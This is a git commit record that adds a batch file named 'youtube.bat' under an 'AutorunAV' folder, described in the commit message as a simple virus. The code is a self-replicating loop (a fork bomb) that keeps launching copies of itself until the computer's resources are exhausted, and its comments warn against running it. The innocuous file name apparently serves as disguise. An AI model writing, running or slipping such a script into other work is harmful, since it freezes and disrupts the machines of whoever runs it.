7708e23f95cca31c0bbd342e47de5cf38883a6f2
Priyanshu Mohanty <61372508+pragmatic-philosopher09@users.noreply.github.com>
2020-11-05 14:32:13 +0530

    Created youtube.bat
    This serves as a simplistic virus file, which on activation will open up multiple Windows command prompts.

---
+++ AutorunAV/youtube.bat
@@ -0,0 +1,6 @@
+:E
+start youtube.bat
+goto E
+rem As silly and small it might look, this simple code can have disastrous consequences,
+rem as it can clog the system's resources and slow down the computer. HENCE, it is HIGHLY ADVISABLE
+rem NOT TO RUN IT!!
